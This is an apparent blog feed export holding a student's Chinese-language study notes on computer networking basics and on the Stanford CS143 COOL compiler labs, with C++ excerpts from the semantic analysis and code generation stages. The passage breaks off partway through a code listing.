href="#计算机网络的吞吐量：" class="headerlink" title="计算机网络的吞吐量："></a>计算机网络的吞吐量：</h4><ul><li>计算机网络的吞吐量实际上是一个速度指标，它描述了<strong>比特经过某个节点的速度</strong> </li><li><strong>某节点的吞吐量 == min(发送数据的速度，接收数据的速度)</strong> </li><li><strong>任何时间的瞬时吞吐量：</strong> 是主机<strong>接受</strong>到该文件的速率</li><li><strong>平均吞吐量：</strong> 该分组的L比特 <strong>/</strong> 主机接收该分组所有的比特用去的时间T</li><li>吞吐量可以近似为源和目的地之间路径的最小传输速率。<strong>最小传输速率的链路为瓶颈链路</strong>。</li><li>在今天，<strong>因特网对吞吐率的限制因素通常是接入网</strong>。</li></ul><h3 id="协议层次及其服务模型："><a href="#协议层次及其服务模型：" class="headerlink" title="协议层次及其服务模型："></a>协议层次及其服务模型：</h3><ul><li>因特网是一个极为复杂的系统，该系统里存在着大量的应用程序和协议、各种类型的端系统、分组交换机和各种类型的链路级媒体。但是它同时也是有着清晰结构的，就像我们前面在网络核心 一节介绍的，我们仍能构建它的结构模型</li></ul><h4 id="分层体系结构"><a href="#分层体系结构" class="headerlink" title="分层体系结构"></a>分层体系结构</h4><ul><li>优点：<ul><li>易于服务实现的多样性,因为某一层对其上一层提供服务，同时它可以利用下一层提供的服务，只要对上提供的服务和对下利用的服务没有变化，其层内部的实现并不会对系统结构产生影响，也就是对于大而复杂且需要不断更新的系统来说 改变服务的实现而不会影响系统其他组件。 </li><li>不用关注下一层如何实现，以及处理故障的细节。</li><li>协议分层具有<strong>概念化和结构化</strong>：<strong>使得模块化使更新系统组件更为容易</strong>。</li></ul></li><li>缺点：<ul><li><strong>功能上的冗余，</strong> 比如许多协议栈针对链路和端到端两种情况都提供了<strong>差错恢复功能</strong></li><li><strong>某层的功能可能需要仅在其它层才能出现的信息，这违反了层次分离的目标</strong></li></ul></li><li>总体来说，将各层的所有协议组合起来，称为协议栈。因特网的协议栈有5个层次组成：物理层、链路层、网络成、传输层、应用层。<ul><li><strong>应用层：</strong> 应用层协议分布在<strong>多个端系统</strong>，端系统中的<strong>应用程序使用该协议与另一个端系统中的应用程序</strong>通信。处于应用层的<strong>分组</strong>称为<strong>报文。</strong></li><li><strong>传输层：</strong> 传输层在应用程序<strong>端点</strong>之间传输应用层报文，因特网中有两个传输层协议：==TCP和UDP==。处于传输层的分组称为<strong>报文段</strong>。TCP提供确保传递、流量控制、拥塞控制机制。UDP提供<strong>无连接</strong>服务，即<strong>不提供不必要服务的服务</strong>, 没有可靠性、没有流量和拥塞控制。</li><li><strong>网络层：</strong> 网络层将称为<strong>数据报</strong>的网络层分组<strong>从一台主机移动到另一台主机</strong>。网络层协议包含著名的IP协议以及其他一些路由选择协议。</li><li><strong>链路层：</strong> 链路层将称为<strong>帧</strong>的链路层分组<strong>从一个结点移动到路径上的另一个结点</strong>。一个帧可能被沿途不同链路上的不同链路层协议处理。</li><li><strong>物理层：</strong> 物理层的任务是将<strong>帧中的比特从一个结点移动到 下一个节点</strong>，它提供了传输信息的实际物理通道；</li></ul></li><li>OSI模型：<ul><li>在<strong>因特网协议栈</strong>出现以前，<strong>OSI模型</strong>是ISO（国际标准化组织）组织研发的计算机网络结构模型。</li><li>OSI的模型一共有7层；</li><li>从下到上依次为：<strong>物理层，链路层，网络层，传输层，会话层，表示层，应用层</strong>。相比因特网体系结构，OSI多了两层。</li><li><strong>因特网</strong>将两层 <strong>（会话层，表示层）</strong> 的功能留给了<strong>开发者自行实现</strong>。</li></ul></li></ul><h4 id="封装："><a href="#封装：" class="headerlink" title="封装："></a>封装：</h4><ul><li>一个分组，在不同的层次有不同的称谓，是因为它们<strong>经过每一层（自上至下）的时候就被该层封装上了属于该层的相关信息</strong>，也就是前面提到的 <strong>（分组中的）必要信息</strong> ；于是，每一分层的分组有<strong>两种类型的字段</strong>：<strong>首部字段和有效负载</strong>；其中<strong>有效负载即为来自上一层的分组数据</strong>，而<strong>首部字段就是该层加上的必要信息</strong>；分组<strong>不断被封装（也就是不断地加首部字段，也就是必要信息）</strong> 以实现各层协议规定的相关功能。</li></ul><h3 id="Networks-Under-Attack"><a href="#Networks-Under-Attack" class="headerlink" title="Networks Under Attack"></a>Networks Under Attack</h3><ul><li>The Bad Guys Can Put Malware into Your Host Via the Internet</li><li>The Bad Guys Can Attack Servers and Network Infrastructure</li><li>The Bad Guys Can Sniff Packets</li><li>The Bad Guys Can Masquerade as Someone You Trust</li></ul><p>We should seek defenses against sniffing, end-point masquerading, man-in-the-middle attacks, DDoS attacks, malware, and more.</p><h2 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章:应用层"></a>第二章:应用层</h2><blockquote><p>还是自己做思维导图吧, 真像以前那样子做的话笔记会详细的过于恐怖了.</p><p>书上是从零开始引导式的, 所以会比较详细.</p><p>(我特么真能写, 真的好多, 不过复习起来也挺爽的)</p></blockquote><p><img src="../../image/Computer_Networking/Computer_Networks.png" alt="Computer_Networks"></p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p><img src="../../image/Computer_Networking/Chapter3.png" alt="Chapter3"></p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p><img src="../../image/Computer_Networking/Chapter4.png" alt="Chapter4"></p><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><p><img src="../../image/Computer_Networking/Chapter5.png" alt="Chapter5"></p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p><img src="../../image/Computer_Networking/Chapter6.png" alt="Chapter6"></p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><p><img src="../../image/Computer_Networking/Chapter7.png" alt="Chapter7"></p><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><p><img src="../../image/Computer_Networking/Chapter8.png" alt="Chapter8"></p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理complier</title>
    <link href="/2021-10/Learning-complier/"/>
    <url>/2021-10/Learning-complier/</url>
    
    <content type="html"><![CDATA[<h1 id="COMPLIER-CS143"><a href="#COMPLIER-CS143" class="headerlink" title="COMPLIER-CS143"></a>COMPLIER-CS143</h1><h2 id="0-预备知识"><a href="#0-预备知识" class="headerlink" title="0. 预备知识"></a>0. 预备知识</h2><h3 id="COOL语言"><a href="#COOL语言" class="headerlink" title="COOL语言"></a>COOL语言</h3><ul><li>只能说是比较复杂, manuals和源码分析详见相关文档</li><li>比较典型的是继承树结构</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">          &#123; -&gt; [String]<br>          &#123; -&gt; [Int]<br>[OBJECT] =&#123; -&gt; [IO]     -&gt; [B]<br>          &#123; -&gt; [Bool]<br>          &#123; -&gt; [A]<br></code></pre></div></td></tr></table></figure><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><ul><li>词法分析-&gt;语法分析-&gt;语义分析</li><li><img src="https://i.loli.net/2021/11/15/AlBoJu85kTGY1FX.png" alt="image-20211013100444035" style="zoom:67%;" /> </li><li><strong>词法分析</strong> <ul><li>从左向右逐行扫描源程序的字符，识别出各个单词，确定单词的类型。将识别出的单词转换成统一的机内表示——词法单元(<strong>token</strong>)形式</li></ul></li><li><strong>语法分析</strong> <ul><li>语法分析器(parser)从词法分析器输出的token序列中识别出各类短语，并构造语法分析树(<strong>parse tree</strong>)</li></ul></li><li><strong>语义分析</strong> <ul><li>收集标识符的属性信息&amp;&amp;语义检查</li></ul></li><li><strong>中间代码</strong> <ul><li>三地址码 (Three-address Code)<div class="hljs code-wrapper"><pre><code>三地址码由类似于汇编语言的指令序列组成，每个指令最多有三个操作数(operand)</code></pre></div></li><li>语法结构树/语法树 (Syntax Trees)</li></ul></li></ul><h3 id="CS143实验文件结构"><a href="#CS143实验文件结构" class="headerlink" title="CS143实验文件结构"></a>CS143实验文件结构</h3><h4 id="list-h"><a href="#list-h" class="headerlink" title="list.h:"></a>list.h:</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">List</span> &#123;</span><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">//可以看到这个list的head是一个元素T, 而另一个是指向List&lt;T&gt;类的指针</span><br>    <span class="hljs-comment">//和平常的单链表是一样的结构</span><br>T *head;<br>    List&lt;T&gt;* tail;<br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="tree-h-cool-tree-h"><a href="#tree-h-cool-tree-h" class="headerlink" title="tree.h+cool-tree.h:"></a>tree.h+cool-tree.h:</h4><ul><li>All APS nodes are derived from tree_node.</li><li>Lists of APS objects are implemented by the “list_node” template.</li><li>Class_, Feature, Expression等等都是指向constructor的指针</li></ul><pre><code class=" mermaid">classDiagramclass tree_node&#123;    int line_number       tree_node()    virtual tree_node *copy() = 0    virtual void dump(ostream&amp; stream, int n) = 0    int get_line_number()    tree_node *set(tree_node *)&#125;class list_node&#123;实现了三个返回下标的迭代器&#125;class append_node&#123;nil_nodesingle_list_node以上三个实现了取出第n个node()&#125;tree_node --|&gt; list_nodelist_node --|&gt; append_nodeclass Class__class&#123;    virtual get_name()    virtual get_parent()    virtual get_features()    virtual get_filename()    virtual dump_with_types(ostream&amp;,int)&#125;Class__class : define simple_phylum_Class_class class__class&#123;   Symbol name;   Symbol parent;   Features features;   Symbol filename;&#125;Class__class --|&gt; class__classtree_node --|&gt; Class__classtree_node --|&gt; Feature_classclass Feature_class&#123;全为纯虚函数:dump_with_types(ostream&amp;,int) = 0Symbol get_name()tc(EnvironmentP)add_to_table(EnvironmentP)&#125;class method_class&#123;    Symbol name;    Formals formals;    Symbol return_type;    Expression expr;    get_return_type()    get_formals()    ...&#125;class attr_class&#123;   Symbol name;   Symbol type_decl;   Expression init;&#125;Feature_class --|&gt; method_classFeature_class --|&gt; attr_classtree_node --|&gt; Formal_classtree_node --|&gt; Case_classtree_node --|&gt; Expression_class</code></pre><h4 id="stringtable"><a href="#stringtable" class="headerlink" title="stringtable:"></a>stringtable:</h4><ul><li>Symbol是指向<strong>Entry</strong>的指针</li></ul><pre><code class=" mermaid">classDiagramdirection RLclass Entry&#123;   Symbol name;   Symbol type_decl;   Expression init;&#125;Entry --|&gt; StringEntryEntry --|&gt; IntEntryEntry --|&gt; IdEntryclass StringTable~Elem~&#123;   List~Elem~ *tbl;   int index;&#125;StringTable .. Entry</code></pre><h4 id="symtab"><a href="#symtab" class="headerlink" title="symtab:"></a>symtab:</h4><pre><code class=" mermaid">classDiagramclass SymtabEntry&#123;    SYM id;    // the key field    DAT *info;    get_id()    get_info()&#125;class SymbolTable~SYM, DAT~&#123;    SymtabEntry~SYM, DAT~=ScopeEntry;    List~ScopeEntry~=Scope;    List~Scope~=ScopeList;private:    ScopeList *tbl;&#125;SymtabEntry .. SymbolTable</code></pre><h2 id="1-lexer-词法分析"><a href="#1-lexer-词法分析" class="headerlink" title="1. lexer - 词法分析"></a>1. lexer - 词法分析</h2><ul><li><p>这一实验看上去就是逐字分析然后根据flex的语法返回token就完事了, 但要知道的是flex的内部原理仍然是有穷自动机finite automate, 具体概念可以看看课程PDF, flex的代码分析可见 <a href="https://github.com/pcy190/CompilerAnalysis/blob/master/flex_analysis.md">这里</a>, 肖哥的分析在 <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week3-6#1-lexer---%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90">这里</a> </p></li><li><p>文件关系:</p><ul><li>lexertest.cc是main函数所在文件, 我们写完cool.flex后flex使用此文件和众多依赖文件编译成lexer(executable)</li><li>cool-lex.cc即为flex自动生成的词法扫描自动机</li></ul></li></ul><h2 id="2-parser-语法分析"><a href="#2-parser-语法分析" class="headerlink" title="2.parser - 语法分析"></a>2.parser - 语法分析</h2><ul><li>此阶段主要任务是构建AST树</li><li>文件关系:<ul><li>parser-phase.cc是main函数所在文件, 调用cool_yyparse函数</li><li>把词法分析编译出的lexer文件放进此PA的文件夹中完成词法分析</li><li>cool.y为我们要编写的bison文件, cool-parse.cc为bison自动生成的源文件, parser为可执行文件</li></ul></li><li> If no parent is specified, the class inherits from the Object class. </li></ul><h2 id="3-semantic-语义分析"><a href="#3-semantic-语义分析" class="headerlink" title="3.semantic - 语义分析"></a>3.semantic - 语义分析</h2><ul><li>semant.h结构</li></ul><pre><code class=" mermaid">classDiagramclass InheritanceNodeclass ClassTableInheritanceNode &lt;|-- class__classClassTable &lt;|-- SymbolTable~Symbol, InheritanceNode~class Environment&#123;    SymbolTable~Symbol, method_class~ method_table;    SymbolTable~Symbol, Entry~  var_table;    ClassTableP class_table;    Class_      self_class;    method表操作函数    variable表操作函数    type操作函数&#125;InheritanceNode : 该class的信息和environmentclass ClassTable &#123; 文件中所有class检查完之后进入ClassTable的构造函数,&#125;</code></pre><p>先看semant-parse.cc入口main函数</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> Program ast_root;      <span class="hljs-comment">// root of the abstract syntax tree</span><br>FILE *ast_file = stdin;       <span class="hljs-comment">// we read the AST from standard input</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">ast_yyparse</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>; <span class="hljs-comment">// entry point to the AST parser</span><br><span class="hljs-keyword">int</span> cool_yydebug;     <span class="hljs-comment">// not used, but needed to link with handle_flags</span><br><span class="hljs-keyword">char</span> *curr_filename;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_flags</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-built_in">handle_flags</span>(argc,argv);<br>  <span class="hljs-built_in">ast_yyparse</span>();<br>  ast_root-&gt;<span class="hljs-built_in">semant</span>();<br>  ast_root-&gt;<span class="hljs-built_in">dump_with_types</span>(cout,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>先是<code>handle_flags()</code>这不知道要干嘛的函数, 然后是<code>ast_yyparse()</code>构造好AST然后将根节点赋值给<code>ast_root</code>, 再执行<code>program_class</code>的<code>semant()</code>函数, <code>dump_with_types()</code>输出AST(不知道要怎么看, 算了也不重要)</p><p>再看<code>semant()</code>函数:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// The function which runs the semantic analyser.</span><br><span class="hljs-function">InheritanceNodeP <span class="hljs-title">program_class::semant</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-built_in">initialize_constants</span>();<br>   ClassTableP classtable = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassTable</span>(classes);<br>   <span class="hljs-keyword">if</span> (classtable-&gt;<span class="hljs-built_in">errors</span>()) &#123;<br>      cerr &lt;&lt; <span class="hljs-string">&quot;Compilation halted due to static semantic errors.&quot;</span> &lt;&lt; endl;<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以想到在ClassTable的构造函数中完成检查AST树, 其中一个流程如下:</p><ul><li>This file implements the semantic checks for Cool.  There are three<br>  passes:<ul><li>Pass 1: This is not a true pass, as only the classes are inspected.<br>  The inheritance graph is built and checked for errors.  There are<br>  two “sub”-passes: check that classes are not redefined and inherit<br>  only from defined classes, and check for cycles in the inheritance<br>  graph.  Compilation is halted if an error is detected between the<br>  sub-passes.</li><li>Pass 2: Symbol tables are built for each class.  This step is done<br>  separately because methods and attributes have global<br>  scope—therefore, bindings for all methods and attributes must be<br>  known before type checking can be done.</li><li>Pass 3: The inheritance graph—which is known to be a tree if<br>  there are no cycles—is traversed again, starting from the root<br>  class Object.  For each class, each attribute and method is<br>  <strong>typechecked</strong>.  Simultaneously, identifiers are checked for correct<br>  definition/use and for multiple definitions.  <strong>An invariant is<br>  maintained that all parents of a class are checked before a class<br>  is checked.</strong> </li></ul></li></ul><p>相应的构造函数为:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">ClassTable::<span class="hljs-built_in">ClassTable</span>(Classes classes) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>), <br>                                          <span class="hljs-built_in">semant_errors</span>(<span class="hljs-number">0</span>),<br>                                          <span class="hljs-built_in">error_stream</span>(cerr)<br>&#123;<br>  <span class="hljs-built_in">enterscope</span>();             <span class="hljs-comment">// initially the symbol table is empty</span><br>  <span class="hljs-built_in">install_basic_classes</span>();  <span class="hljs-comment">// predefined basic classes, 这个预设的写得差不多了</span><br>  <span class="hljs-keyword">if</span> (semant_debug)  cerr &lt;&lt; <span class="hljs-string">&quot;Installed basic classes.&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">install_classes</span>(classes); <span class="hljs-comment">// user defined classes, attach it to the tail of symbolTableList</span><br>  <span class="hljs-keyword">if</span> (semant_debug) <br>    &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Installed user-defined classes&quot;</span> &lt;&lt; endl; <span class="hljs-built_in">dump</span>(); &#125;<br>                                              <br>  <span class="hljs-built_in">check_improper_inheritance</span>();  <span class="hljs-comment">// check for undefined class and `CantInherit` class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for simple inheritance errors.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//遇到上面这种fatal_error的时候就不能往下继续semant了， 必须报错并退出程序</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//经过了install【basic】classes和check-improper-inheritance，</span><br>  <span class="hljs-comment">//可以保证所建立的继承树每个节点都有valid parent，所以直接使用set_relations</span><br>  <span class="hljs-built_in">build_inheritance_tree</span>(); <span class="hljs-comment">// set class-nodes&#x27; parent and added to parent&#x27;s children list</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built inheritance tree.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">mark_reachable</span>(); <span class="hljs-comment">// find all classes reachable from root class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Marked reachable classes.&quot;</span> &lt;&lt; endl; &#125;                                           <br>  <span class="hljs-comment">// This method should be run only after mark_reachable has executed.</span><br>  <span class="hljs-comment">// **If there are any unreachable classes in the inheritance graph and</span><br>  <span class="hljs-comment">// all of the local checks of check_improper_inheritance succeeded,</span><br>  <span class="hljs-comment">// then there is a cycle in the inheritance graph**.</span><br>  <span class="hljs-built_in">check_for_cycles</span>();       <br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for cycles.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//遇到cycles的时候同理 必须报错并退出程序</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//首先检查完feature每一项, 然后向env的meth_table或var_table加入该feature</span><br>  <span class="hljs-comment">//然后copy the parent&#x27;s environment to children&#x27;s env</span><br>  <span class="hljs-built_in">build_feature_tables</span>();   <span class="hljs-comment">// build symbol tables of features for each class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built feature tables.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">check_main</span>();             <span class="hljs-comment">// check for Main class and main method</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked Main class and method.&quot;</span> &lt;&lt; endl; &#125;<br>                                              <br>  <span class="hljs-comment">// type check all expressions, first root, then all the way down to its children</span><br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">type_check_features</span>(); <br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后各种细节细到难以置信, 都不敢想象我自己写到底要用掉多少时间</p><h2 id="4-codeGenerate-代码生成"><a href="#4-codeGenerate-代码生成" class="headerlink" title="4.codeGenerate - 代码生成"></a>4.codeGenerate - 代码生成</h2><p>代码生成框架:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">CgenClassTable::<span class="hljs-built_in">CgenClassTable</span>(Classes classes, ostream&amp; s) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>) , <span class="hljs-built_in">str</span>(s)<br>&#123;<br>   <span class="hljs-comment">//stringclasstag = 0 /* Change to your String class tag here */;</span><br>   <span class="hljs-comment">//intclasstag =    0 /* Change to your Int class tag here */;</span><br>   <span class="hljs-comment">//boolclasstag =   0 /* Change to your Bool class tag here */;</span><br><br>   <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;Building CgenClassTable&quot;</span> &lt;&lt; endl;<br>   num_classes = <span class="hljs-number">0</span>;<br>   <span class="hljs-comment">// make sure the various tables have a scope</span><br>   class_to_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   class_to_max_child_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   tag_to_class_table.<span class="hljs-built_in">enterscope</span>();<br>   table_of_method_tables.<span class="hljs-built_in">enterscope</span>();<br><br><br>   <span class="hljs-built_in">enterscope</span>();<span class="hljs-comment">//init a new Scope to ScopeList</span><br>   <span class="hljs-built_in">install_basic_classes</span>();<span class="hljs-comment">//the same as PA4</span><br>   <span class="hljs-built_in">install_classes</span>(classes);<br>   <span class="hljs-built_in">build_inheritance_tree</span>();<span class="hljs-comment">//building complete</span><br><br>   <span class="hljs-comment">// 递归，将每个CgenNode的attr/method数据</span><br>   <span class="hljs-comment">// 都填入CgenNode和CgenClassTable中的table中</span><br>   <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">init</span>(<span class="hljs-number">0</span><span class="hljs-comment">//root() returns CgenNode class</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,<span class="hljs-keyword">int</span>&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,MethodBinding&gt;)<br>               ,<span class="hljs-number">0</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,VarBinding&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,Entry&gt;));<br>   <span class="hljs-comment">// 生成代码</span><br>   <span class="hljs-built_in">code</span>();<br>   <span class="hljs-built_in">exitscope</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>在生成目标代码前，需要先读入<strong>AST</strong>的相关信息，**重建继承图<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="因为此时已经通过了semant, 可以确定AST是正确的从而无需检查">[1]</span></a></sup><strong>，并自上而下的初始化相关的映射表格<br>在该初始化过程中，每个类会遍历其中的<code>feature</code>，并将其相关信息添加至对应的<code>SymbolTable</code>中<br>如果该<code>feature</code>是<code>method</code>，则还会额外自顶向下计算所需要的</strong>最小临时变量数量<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="Stanford-cs143-pdf中提到的">[2]</span></a></sup>**，并将其添加进表格中。</li></ul><ul><li>init()的过程:<ul><li>从形参中得到该class初始feature个数</li><li>assign_tag</li><li>各种enterscope</li><li>装载features, 用到了layout_featues:<ul><li>layout_method():</li><li>layout_attr():</li></ul></li><li>各种map的赋值</li></ul></li><li>code()的过程:</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CgenClassTable::code</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global data&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_data</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;choosing gc&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_select_gc</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding constants&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_constants</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - prototype objects</span><br><span class="hljs-comment">//                   - class_nameTab</span><br><span class="hljs-comment">//                   